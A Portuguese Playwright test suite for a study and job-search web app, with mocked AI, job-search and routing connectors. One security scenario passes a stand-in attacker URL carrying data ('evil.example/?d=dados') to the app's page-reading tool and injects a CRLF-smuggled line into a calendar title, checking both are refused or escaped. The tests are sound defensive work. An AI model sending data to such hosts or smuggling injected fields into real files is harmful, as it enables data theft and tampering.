/* Testes do app Yaad1 (projetos/sala-caverna/index.html), com IA, conectores, ditado e voz SIMULADOS.
   Uso: node ferramentas/testes/yaad1.test.js   (sai com código 1 se algo falhar)
   Cada cenário abre o app do zero em 375 e 390 px e confere: comportamento, ausência de erros e de rolagem lateral.
   Dados de teste fictícios; nada é enviado a serviço nenhum. */
const { chromium } = require("playwright");
const path = require("path");
const APP = "file://" + path.resolve(__dirname, "../../projetos/sala-caverna/index.html");
const LARGURAS = [375, 390];
let falhas = 0, passos = 0;
const ok = (cond, msg) => { passos++; if (!cond) { falhas++; console.log("  ✗ " + msg); } };

/* Simulações reaproveitadas pelos cenários */
const MOCKS = () => {
  const job = (id, name, city, dl, sal) => ({ id, name, careerPageName: "Empresa " + id, type: "vacancy_type_effective", publishedDate: "2026-11-25T19:31:27.846Z", applicationDeadline: dl, city, state: "Roraima", jobUrl: "https://x.gupy.io/job/" + id, workplaceType: "on-site", description: "Requisitos: Excel; Power BI é diferencial.", salary: sal ? { status: "disclosed", label: "Salário: R$ 3.034,02/mês" } : { status: "not_disclosed", label: "" } });
  window.__chamadas = [];
  LIMITS = { tools: true };
  MCP = {
    describeTool: async () => ({ inputSchema: { properties: { objective: { type: "string" }, urls: { type: "array" } }, required: ["objective"] } }),
    callTool: async (server, tool, input) => {
      window.__chamadas.push(server + ":" + tool);
      if (server === "Gupy" && tool === "search_jobs") return { payload: { data: { data: [job(1, "Assistente Administrativo", "Boa Vista", "2026-12-15", true), job(2, "Atendente", "Iracema", "2026-12-20"), job(3, "Vaga vencida", "Boa Vista", "2026-11-01")], pagination: { total: 83 } } } };
      if (server === "Gupy" && tool === "get_job_by_id") return { payload: { data: job(input.id, "Assistente Administrativo", "Boa Vista", "2026-12-15", true) } };
      if (tool === "tomtom-geocode") return { payload: { features: [{ geometry: { coordinates: input.query.startsWith("Iracema") ? [-61.05, 2.17] : [-60.67, 2.82] } }] } };
      if (tool === "tomtom-routing") return { payload: { features: [{ properties: { summary: { lengthInMeters: 98000, travelTimeInSeconds: 5100 } } }] } };
      return { payload: { results: [] } };
    }
  };
  const resp = (pr) => {
    if (/liga a pessoa a oportunidades REAIS/.test(pr)) return { itens: [{ tipo: "seletivo", titulo: "Recenseador do IBGE", onde: "Iracema - RR", salario: "R$ 1.741", inscricao_ate: "2026-11-30", prova: "2027-01-31", porque: "Renda perto.", url: "https://www.ibge.gov.br/x" }] };
    if (/LEIA o edital oficial/.test(pr)) return { titulo: "Recenseador IBGE", prova: "2027-01-31", banca: "Cesgranrio", corte: "18 de 60 pontos", materias: [{ n: "Língua Portuguesa", questoes: 15, topicos: ["Interpretação"] }, { n: "Matemática", questoes: 15, topicos: ["Porcentagem"] }], marcos: [{ r: "Inscrição até", d: "2026-11-30" }, { r: "Prova", d: "2027-01-31" }] };
    if (/SALA VIVA/.test(pr)) return { cenas: [{ quem: "professor", fala: "Vamos isolar o x." }, { quem: "professor", fala: "Sua vez.", pausa: { p: "3x=9, x=?", o: ["3", "6", "9"], c: 0, porque: "9/3=3." } }] };
    if (/Crie 6 questões/.test(pr)) return { qs: Array.from({ length: 6 }, (_, i) => ({ mat: i % 2 ? "Matemática" : "Língua Portuguesa", tema: "T" + i, p: "Q" + i, o: ["A", "B", "C", "D", "E"], c: i % 5, e: "Porque." })) };
    if (/Resolva cada questão/.test(pr)) return { r: [0, 1, 2, 3, 4, 9] };
    if (/Prepare uma CANDIDATURA/.test(pr)) return { aderencia: { nota: "média", atende: ["Excel"], parcial: [], falta: ["TOTVS"] }, curriculo: "RESUMO\n[COMPLETAR: telefone]", mensagem: "Olá.", perguntas: [{ p: "Fale de você.", como_responder: "Conte." }], antes_de_enviar: ["Telefone"], cuidado: "TOTVS." };
    return { titulo: "Aula", ideia: "x", passos: [{ t: "P", txt: "t" }], exemplo: { enunciado: "a", resolucao: "b" }, quadro: "2x=4", armadilhas: [], treino: [] };
  };
  const fn = async (turns, opts) => { const T = Object.fromEntries((opts.tools || []).map(t => [t.name, t])); if (T.propor_ritmo) await T.propor_ritmo.execute({ ritmo: "manter", dias: 14, motivo: "trabalho" }); const t = "Deixei pronto para você confirmar."; if (opts.onText) opts.onText({ text: t }); return { text: t }; };
  fn.json = async (pr) => resp(pr); fn.limits = async () => ({});
  SAMPLE = fn;
  M.profile.local = { cidade: "Iracema", uf: "RR" };
};

async function abrir(b, w) {
  const ctx = await b.newContext({ viewport: { width: w, height: 860 } });
  const p = await ctx.newPage(); const erros = [];
  p.on("pageerror", e => erros.push(e.message));
  await p.addInitScript(() => { window.__SEM_SEMENTE = true; });
  await p.clock.install({ time: new Date(2026, 10, 27, 10, 5) });
  await p.goto(APP); await p.waitForTimeout(700);
  await p.evaluate(MOCKS);
  return { p, ctx, erros };
}
const semRolagem = async (p, w) => (await p.evaluate(() => document.documentElement.scrollWidth)) <= w;

const CENARIOS = {
  "Início carrega com o passo de hoje": async (p) => {
    await p.evaluate(() => { TAB = "hoje"; render(); });
    ok(!!(await p.$(".hero")), "tela inicial sem o destino (hero)");
    ok(!!(await p.$(".passo-big")), "sem o cartão do passo de hoje");
  },
  "Oportunidades: Gupy, distância, vencidas fora, cidade primeiro": async (p) => {
    await p.evaluate(() => { M.oport = {}; openOportunidades("perto"); }); await p.waitForTimeout(900);
    const cards = await p.$$eval(".op-card", cs => cs.map(c => c.textContent));
    ok(cards.some(t => /Recenseador do IBGE/.test(t)), "resultado do Claude ausente");
    ok(cards.some(t => /Vaga real · Gupy/.test(t)), "vaga da Gupy ausente");
    ok(!cards.some(t => /Vaga vencida/.test(t)), "vaga vencida apareceu");
    ok(cards.some(t => /de carro/.test(t)), "distância de carro ausente");
  },
  "Quero essa → frente com passo de hoje": async (p) => {
    await p.evaluate(() => { M.oport = { perto: { data: "2026-11-27", itens: [{ tipo: "seletivo", titulo: "Recenseador do IBGE", onde: "Iracema - RR", inscricao_ate: "2026-11-30", prova: "2027-01-31", url: "https://www.ibge.gov.br/x" }] } }; openOportunidades("perto"); });
    await p.click('[data-op="quero"]'); await p.waitForTimeout(400);
    for (let i = 0; i < 5; i++) { await p.click('[data-sh="next"]'); await p.waitForTimeout(120); }
    ok(await p.evaluate(() => frentes().length === 1 && frentes()[0].banca === "Cesgranrio"), "frente não criada com a banca do edital");
    ok(/Língua Portuguesa|Matemática/.test(await p.textContent(".passo-big")), "passo de hoje não aponta matéria da frente");
  },
  "Minha vida mudou: proposta, aplicar e recusar": async (p) => {
    await p.evaluate(() => { M.frentes = [{ id: "fx", titulo: "IBGE", materias: [{ n: "Matemática", questoes: 15, topicos: [] }], marcos: [], min: 40, dias: [1, 2, 3, 4, 5], criada: "2026-11-26", ok: {} }]; openVida(); });
    await p.click('[data-pick="tipo"] [data-v="emprego"]'); await p.click('[data-sh="next"]');
    await p.click('[data-pick="min"] [data-v="20"]'); await p.click('[data-sh="next"]'); await p.waitForTimeout(80);
    ok(/Manter/.test(await p.textContent(".rc")), "proposta sem o ritmo Manter");
    await p.click('[data-sh="next"]'); await p.waitForTimeout(80);
    ok(await p.evaluate(() => M.rota.marcha === "manter" && M.frentes[0].min === 20), "aplicar não mudou o ritmo e o tempo");
    await p.evaluate(() => openVida()); await p.click('[data-pick="tipo"] [data-v="pesada"]'); await p.click('[data-sh="next"]'); await p.click('[data-sh="next"]'); await p.click('[data-vd="nao"]');
    ok(await p.evaluate(() => M.rota.marcha === "manter" && M.rota.planos.some(x => x.status === "recusado")), "recusar alterou algo ou não registrou");
  },
  "Sua preparação: gabarito conferido e domínio real": async (p) => {
    await p.evaluate(() => { M.frentes = [{ id: "fx", titulo: "IBGE", banca: "Cesgranrio", materias: [{ n: "Língua Portuguesa", questoes: 15, topicos: [] }, { n: "Matemática", questoes: 15, topicos: [] }], marcos: [], min: 40, dias: [1, 2, 3, 4, 5], criada: "2026-11-26", ok: {} }]; TAB = "hoje"; render(); });
    await p.click('[data-act="pq-gerar"]'); await p.waitForTimeout(400);
    ok(await p.evaluate(() => M.prep.fx.pool.length === 5), "questão com gabarito divergente não foi descartada");
    await p.click('.prep [data-act="pq"][data-j="4"]'); await p.waitForTimeout(80);
    ok(await p.evaluate(() => M.prep.fx.resp.length === 1 && (M.erros || []).length === 1), "resposta errada não registrada na Forja");
  },
  "Sala viva: pausa bloqueia e Pergunte à turma": async (p) => {
    await p.evaluate(() => { const ks = Object.keys(SUBJ); openStudy({ dstr: iso(today()), b: null, livre: true, mat: ks[0], topic: "Equações" }); FLOW.at = FLOW.steps.indexOf("aula"); drawStudy(); });
    await p.waitForTimeout(300); await p.click('[data-act="sala"]'); await p.waitForTimeout(300);
    await p.click('[data-sl="next"]'); await p.waitForTimeout(100);
    ok(await p.isDisabled('[data-sl="next"]'), "pausa não bloqueou a próxima cena");
  },
  "Assistente: ferramenta propõe e só aplica com toque": async (p) => {
    await p.evaluate(() => { TAB = "hoje"; render(); openChat(); });
    await p.fill("#chi", "Arrumei um trabalho"); await p.press("#chi", "Enter"); await p.waitForTimeout(250);
    ok(await p.evaluate(() => (M.rota || {}).marcha !== "manter"), "mudou o ritmo antes do toque");
    await p.click('.acao [data-ac="sim"]'); await p.waitForTimeout(80);
    ok(await p.evaluate(() => M.rota.marcha === "manter"), "Aplicar não mudou o ritmo");
  },
  "FSRS: intervalos e limite da prova": async (p) => {
    const r = await p.evaluate(() => { M.frentes = []; const a = fsrsNext(null, 3, "2026-11-27"); const b = fsrsNext(a.card, 3, a.due); M.frentes = [{ id: "fx", titulo: "X", materias: [], marcos: [{ r: "Prova", d: "2026-12-10" }], min: 40, dias: [1], criada: "2026-11-26", ok: {} }]; const c = fsrsNext({ S: 60, D: 5, last: "2026-11-20" }, 3, "2026-11-27"); return [a.ivl, b.ivl, c.ivl]; });
    ok(r[0] === 4 && r[1] === 15, "intervalos do FSRS fora do esperado: " + r);
    ok(r[2] <= 12, "FSRS agendou depois da prova");
  },
  "Jogos: conteúdo conferido, partida e erros na revisão": async (p) => {
    const r = await p.evaluate(async () => {
      const AF = [["2+2=4.", true], ["3 é par.", false], ["10/2=5.", true], ["7 é múltiplo de 2.", false], ["1 km = 1000 m.", true], ["0 é negativo.", false], ["5² = 25.", true]];
      SAMPLE = { limits: async () => ({}), json: async (pr) => {
        if (/VERDADEIRO ou FALSO/.test(pr)) return { af: AF.map(([t, v]) => ({ t, v, tema: "x", e: "y" })).concat([{ t: "Afirmação com gabarito errado.", v: true, e: "" }]) };
        if (/Julgue cada/.test(pr)) { const l = JSON.parse(pr.split("Afirmações: ")[1]); return { r: l.map(t => { const a = AF.find(x => x[0] === t); return a ? a[1] : false; }) }; }
        return {}; } };
      openJogos("relampago"); document.querySelector('[data-pick="jmat"] button').click(); document.querySelector('[data-jg="ir"]').click();
      await new Promise(r => setTimeout(r, 200));
      const n = FLOW.c.g.af.length; let i = 0;
      while (document.querySelector(".jg-af")) { const t = document.querySelector(".jg-af").textContent, v = AF.find(x => x[0] === t)[1]; document.querySelector(`[data-jg="vf"][data-v="${(i++ === 0 ? !v : v) ? 1 : 0}"]`).click(); }
      return { n, fim: /pontos/.test(document.querySelector("#shb").textContent), part: M.jogos.partidas.length, erro: (M.erros || []).some(e => e.certa === "Verdadeiro" || e.certa === "Falso") };
    });
    ok(r.n === 7, "afirmação com gabarito errado não foi descartada na conferência (" + r.n + ")");
    ok(r.fim && r.part === 1, "partida não terminou ou não foi salva");
    ok(r.erro, "erro do jogo não foi para a revisão");
  },
  "GAME: Operação Cidade, regras determinísticas e evidências": async (p) => {
    const r = await p.evaluate(async () => {
      SAMPLE = null; M.game = {}; openCidade();
      const clica = s => document.querySelector(s).click();
      clica('.btn[data-cd="comecar"]'); clica('[data-cd="e1"]');
      const rg = document.querySelector("#cd-pct"); rg.value = "15"; rg.dispatchEvent(new Event("input")); clica('[data-cd="e1p"]');
      document.querySelector("#cd-v").value = "15"; clica('[data-cd="e1v"]'); const d1 = M.game.atual.erros.slice(-1)[0];
      document.querySelector("#cd-v").value = "1.500"; clica('[data-cd="e1v"]');
      clica('[data-k="rampa"]'); clica('[data-k="guarda"]'); clica('[data-k="luz"]'); clica('[data-cd="e2"]'); const estourou = M.game.atual.fase === "e2";
      clica('[data-k="luz"]'); clica('[data-cd="e2"]');
      closeSheet(); openCidade(); const retomou = M.game.atual && M.game.atual.fase === "e3";
      document.querySelector("#cd-v3").value = "6800"; clica('[data-cd="e3"]'); const d3 = M.game.atual.erros.slice(-1)[0];
      document.querySelector("#cd-v3").value = "9200"; clica('[data-cd="e3"]');
      const s = M.game.sessoes.slice(-1)[0];
      return { d1, d3, estourou, retomou, dom: s && s.dominio, conf: s && s.confianca, forja: (M.erros || []).filter(e => /Operação Cidade/.test(e.p)).length, rev: (M.revisoes || []).some(x => /Operação Cidade/.test(x.topic)), cv: /Porcentagem/.test(cvVivoTxt()), semIA: SAMPLE === null };
    });
    ok(r.d1 === "pct_valor" && r.d3 === "inverteu", "diagnóstico do erro de porcentagem errado: " + r.d1 + "/" + r.d3);
    ok(r.estourou, "orçamento estourado foi aceito");
    ok(r.retomou, "missão não retomou na etapa certa");
    ok(r.dom === true && r.conf === "média", "regra de domínio/confiança inesperada: " + r.dom + "/" + r.conf);
    ok(r.forja === 2 && r.rev && r.cv && r.semIA, "evidências não voltaram ao app ou o jogo dependeu da IA");
  },
  "Correção pendente e sincronização visível": async (p) => {
    const r = await p.evaluate(async () => {
      let falha = true;
      SAMPLE = { limits: async () => ({}), json: async () => { if (falha) throw { code: "rate_limited" }; return { descricao: .9, nota: .9, feedback: "Bom.", lacunas: [] }; } };
      openStudy({ dstr: iso(today()), b: null, mat: Object.keys(SUBJ)[0], topic: "Frações", livre: true });
      Object.assign(FLOW.data, { conta: "Fração é parte de um todo; somo com o mesmo denominador.", quiz: { qs: [{ p: "1/2+1/2?", o: ["1", "2"], c: 0 }], aberta: { p: "Explique", criterio: "x" } }, ans: { 0: 0 }, aberta: "Porque..." });
      await gradeQuiz();
      const pend = { res: FLOW.data.result, sess: !!(M.sessao && M.sessao.data.result && M.sessao.data.result.pendente) };
      closeSheet(); const aindaSess = !!M.sessao; resumeSession();
      const voltouNoFim = FLOW.steps[FLOW.at] === "fim" && FLOW.data.result && FLOW.data.result.pendente;
      falha = false; document.querySelector('[data-act="recorrigir"]').click(); await new Promise(r => setTimeout(r, 80));
      const depois = FLOW.data.result;
      // sincronização: nuvem recusa
      let ok = false; DB = { collection: () => ({ doc: () => ({ set: () => ok ? Promise.resolve() : Promise.reject(new Error("offline")) }) }) }; UID = "u1";
      dbPut("main", { a: 1 }, 0); await new Promise(r => setTimeout(r, 60)); const aviso = !!document.getElementById("sync-st");
      ok = true; document.getElementById("sync-st").click(); await new Promise(r => setTimeout(r, 60)); const sumiu = !document.getElementById("sync-st");
      DB = null;
      return { pendente: pend.res && pend.res.pendente, semNota: pend.res && pend.res.score == null && !pend.res.pass, sess: pend.sess, aindaSess, voltouNoFim, passou: depois && depois.pass, aviso, sumiu };
    });
    ok(r.pendente && r.semNota, "falha da IA ainda gera nota ou aprovação");
    ok(r.sess && r.aindaSess && r.voltouNoFim, "correção pendente não sobreviveu a fechar e retomar");
    ok(r.passou, "Corrigir agora não corrigiu quando a IA voltou");
    ok(r.aviso && r.sumiu, "falha de sincronização silenciosa ou aviso não some ao sincronizar");
  },
  "Início com o núcleo do Caverna e certificados": async (p) => {
    const r = await p.evaluate(() => {
      M.sessao = { proj: PID(), dstr: iso(today()), k: null, mat: Object.keys(SUBJ)[0], livre: true, at: 2, ts: Date.now(), data: { topic: "Álgebra" } };
      TAB = "hoje"; PAINEL = false; render();
      const ini = { going: !!document.querySelector(".inicio .going"), ribbon: !!document.querySelector(".inicio #ribbon"), prog: (document.querySelector(".hoje-prog") || {}).textContent || "" };
      const st = dayStats(iso(today()));
      TAB = "evolucao"; EVOTAB = "metas"; render();
      const sel = document.querySelector("#ct-kaggle-sql"); sel.value = "concluído"; sel.dispatchEvent(new Event("change", { bubbles: true }));
      return { ...ini, total: st.total, certs: document.querySelectorAll("[data-cert]").length, cv: /Certificado: Intro to SQL/.test(cvVivoTxt()), anb: /Produtos do mercado financeiro/.test(SUBJ.anbima.lv.join()) };
    });
    ok(r.going && r.ribbon, "Início sem o estudo em andamento ou sem a faixa de evolução");
    ok(new RegExp("de " + r.total + " ").test(r.prog), "contagem do dia diferente da faixa: " + r.prog);
    ok(r.certs === 7 && r.cv, "certificados ausentes ou não entraram no currículo vivo");
    ok(r.anb, "ANBIMA ainda com a estrutura antiga da CPA-10");
  },
  "Jornada, mapa do radar e currículo vivo": async (p) => {
    const r = await p.evaluate(() => {
      M.profile.local = { cidade: "Iracema", uf: "RR" }; M.geo = { "iracema|RR": [-61.05, 2.18], "boa vista|RR": [-60.67, 2.82] };
      M.oport = { perto: { data: "2026-11-27", itens: [{ tipo: "vaga", titulo: "Assistente", onde: "Boa Vista - RR", inscricao_ate: "2026-12-15" }, { tipo: "seletivo", titulo: "IBGE", onde: "Iracema - RR", inscricao_ate: "2026-11-30" }] } };
      const a = alvoPrep(), st = prepSt(a), m = a.mats[0].n; for (let i = 0; i < 12; i++) st.resp.push({ id: "t" + i, mat: m, ok: i % 6 !== 0, d: "2026-11-26" });
      M.candidaturas = [{ key: "g1", titulo: "Assistente", status: "enviada" }]; TAB = "hoje"; render();
      const jorn = document.querySelector(".estrada-h [aria-current=step]");
      openOportunidades("perto"); const mapa = document.querySelector("#shb .rmapa svg");
      closeSheet(); openConquistas(); const cv = document.querySelector(".cvv");
      return { jorn: jorn && jorn.textContent, mapa: mapa && mapa.getAttribute("aria-label"), pins: mapa ? mapa.querySelectorAll(".pin").length : 0, cv: cv && cv.textContent, txt: cvVivoTxt() };
    });
    ok(r.jorn === "Conquistar", "jornada não marcou Conquistar depois da candidatura enviada: " + r.jorn);
    ok(r.pins === 2 && /2 oportunidades em 2 cidades/.test(r.mapa || ""), "mapa do radar sem os pinos certos: " + r.mapa);
    ok(/83% de acerto/.test(r.txt) && /1 candidatura enviada/.test(r.txt), "currículo vivo sem os fatos do treino: " + r.txt);
  },
  "IBGE: frente, questões do guia, prioridade na agenda e metas": async (p) => {
    const r = await p.evaluate(() => {
      const antes = metas().some(g => g.frente); window.__SEM_SEMENTE = false; const sem = semearIBGE(), de_novo = semearIBGE();
      const f = frentes().find(x => x.id === "ibge2027"), seg = blocksOf(new Date(2026, 10, 30)), dom = blocksOf(new Date(2026, 10, 29)), depois = blocksOf(new Date(2027, 1, 1));
      const ibge = seg.find(b => b.foco); openBlock("2026-11-30", bkey(ibge));
      return { antes, sem, de_novo, f: !!f, pool: M.prep.ibge2027.pool.length, seg: ibge.l, c: ibge.c, kind: kindOf(ibge), mats: matsOfBlock(ibge).length,
        fe: seg.some(b => /Bíblia/.test(b.l)) && seg.some(b => /Oração/.test(b.l)), sexta: blocksOf(new Date(2026, 11, 4)).some(b => /ANBIMA/.test(b.l)),
        dom: dom.some(b => b.foco && /opcional/.test(b.l)), depois: depois.some(b => b.foco), frente: FLOW.frente, mat: FLOW.mat, topic: FLOW.data.topic,
        top: topGoal().g.id, ativa: frenteAtiva().id };
    });
    ok(!r.antes, "metas do IBGE apareceram sem a frente");
    ok(r.sem && !r.de_novo && r.f && r.pool === 24, "semente do IBGE errada (repetiu ou sem as 24 questões)");
    ok(/IBGE: Conhecimentos Técnicos/.test(r.seg) && r.c === "op" && r.kind === "estudo" && r.mats === 0, "bloco de segunda não virou IBGE");
    ok(r.fe && r.sexta && r.dom && !r.depois, "agenda mexeu em fé ou ANBIMA de sexta, ou não voltou depois da prova");
    ok(r.frente === "ibge2027" && /^Conhecimentos Técnicos · /.test(r.mat) && r.topic === "O IBGE e o Censo Agro", "bloco IBGE não abriu o estudo da frente: " + r.mat + " / " + r.topic);
    ok(r.top === "ibge-insc" && r.ativa === "ibge2027", "missão não prioriza a inscrição do IBGE: " + r.top);
    const m = await p.evaluate(() => { closeSheet(); const f = frentes()[0]; f.ok[0] = true; return Math.round(goalProgress(GOALS.find(g => g.id === "ibge-insc")) * 100); });
    ok(m === 100, "marcar a inscrição na frente não concluiu a meta");
  },
  "Sala viva no rodapé: hall, caderno, biblioteca e aula ao vivo": async (p) => {
    ok(/Sala viva/.test(await p.textContent('.tabbar [data-tab="estudar"]')), "rodapé sem a Sala viva");
    await p.click('.tabbar [data-tab="estudar"]'); await p.waitForTimeout(200);
    ok(!!(await p.$(".hall .hall-aula")) && (await p.$$(".hall-it")).length === 6, "hall sem a aula de hoje ou sem os 6 ambientes");
    ok(await p.evaluate(() => !!M.presenca[iso(today())]) && /1 de 7/.test(await p.textContent(".hall-pres")), "presença do dia não marcada");
    ok(!!(await p.$("#hall-lab [data-act=cidade]")) && !!(await p.$("#hall-estudos")), "laboratório ou sala de estudos sumiram");
    await p.click('[data-k="caderno"]'); await p.fill("#cad-t", "Escala 1:50.000: 1 cm são 500 m"); await p.click('[data-cad="salvar"]');
    ok(/Escrito por você/.test(await p.textContent("#shb")) && /500 m/.test(await p.textContent("#shb")), "anotação não foi para o caderno");
    await p.evaluate(() => { closeSheet(); window.__SEM_SEMENTE = false; semearIBGE(); render(); }); await p.click('[data-k="biblioteca"]');
    ok((await p.$$eval("#shb a[href*='ibge.gov.br']", a => a.length)) >= 2 && (await p.$$eval("#shb a", a => a.every(x => x.rel.includes("noopener")))), "biblioteca sem o material do IBGE ou sem noopener");
    await p.evaluate(() => closeSheet()); await p.click('[data-act="hall-aula"]'); await p.waitForTimeout(150);
    ok(await p.evaluate(() => FLOW && FLOW.kind === "study" && FLOW.salaAuto === true), "Entrar na aula não preparou a Sala viva automática");
    await p.click('[data-sh="next"]'); await p.waitForTimeout(700);
    ok(await p.evaluate(() => !!FLOW.data.sala || !!document.querySelector(".sala-quadro, .sala")), "a aula não abriu a Sala viva sozinha");
  },
  "Segurança: link desconhecido recusado e .ics blindado": async (p) => {
    const r = await p.evaluate(async () => {
      const tools = await ferramentasBusca(); const ler = tools.find(t => t.name === "ler_pagina");
      const recusa = ler ? await ler.execute({ url: "https://evil.example/?d=dados", objetivo: "x" }) : "sem ferramenta";
      const f = { id: "fx", titulo: "IBGE;X\r\nURL:https://evil.example", materias: [], marcos: [{ r: "Prova", d: "2026-12-10" }], min: 40, dias: [1], criada: "2026-11-26", ok: {} };
      return { recusa, ics: icsDaFrente(f) };
    });
    ok(/recusado/i.test(r.recusa), "ler_pagina leu um link que não veio das buscas");
    ok(!/\r\nURL:/.test(r.ics) && /IBGE\\;X/.test(r.ics), ".ics aceitou uma linha injetada ou não escapou o ponto e vírgula");
  },
  "Candidatura: pacote e acompanhamento": async (p) => {
    await p.evaluate(() => { M.curriculo = "Pastor há 8 anos, finanças da igreja. Excel e Power BI."; M.oport = { perto: { data: "2026-11-27", itens: [{ tipo: "vaga", titulo: "Assistente Administrativo", orgao: "SJMR", onde: "Boa Vista - RR", inscricao_ate: "2026-12-15", url: "https://x.gupy.io/job/1", fonte: "gupy", gid: 1, dist: null }] } }; openOportunidades("perto"); });
    await p.click('[data-op="cand"]'); await p.waitForTimeout(400);
    ok(/COMPLETAR/.test(await p.textContent("#shb")), "currículo adaptado não apareceu");
    await p.click('[data-pick="cst"] [data-v="enviada"]');
    ok(await p.evaluate(() => conquistas().find(c => c.n === "Primeira candidatura").got), "conquista da candidatura não acendeu");
  }
};

(async () => {
  const b = await chromium.launch();
  for (const [nome, fn] of Object.entries(CENARIOS)) {
    for (const w of LARGURAS) {
      const antes = falhas; const { p, ctx, erros } = await abrir(b, w);
      try { await fn(p); } catch (e) { falhas++; console.log("  ✗ exceção: " + e.message.split("\n")[0]); }
      ok(erros.length === 0, "erros de JavaScript: " + erros.join(" | "));
      ok(await semRolagem(p, w), "rolagem lateral em " + w + "px");
      console.log((falhas === antes ? "✓ " : "✗ ") + nome + " (" + w + "px)");
      await ctx.close();
    }
  }
  await b.close();
  console.log(`\n${passos - falhas}/${passos} verificações ok` + (falhas ? ` · ${falhas} FALHA(S)` : ""));
  process.exit(falhas ? 1 : 0);
})();
